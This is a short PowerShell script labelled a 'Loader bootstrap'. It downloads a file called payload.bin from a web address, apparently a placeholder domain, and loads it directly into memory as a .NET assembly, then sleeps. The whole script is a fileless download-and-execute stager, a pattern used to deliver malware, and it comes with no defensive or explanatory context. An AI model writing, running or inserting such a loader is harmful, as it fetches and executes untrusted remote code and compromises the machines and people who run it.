
<# Loader bootstrap #>
[CmdletBinding()]
param(
    [string]$TransferUrl = "http://adatum.com:80/payload.bin"
)
$AssemblyBytes = (New-Object System.Net.WebClient).DownloadData($TransferUrl)
[Reflection.Assembly]::Load($AssemblyBytes)
Start-Sleep -Seconds 8
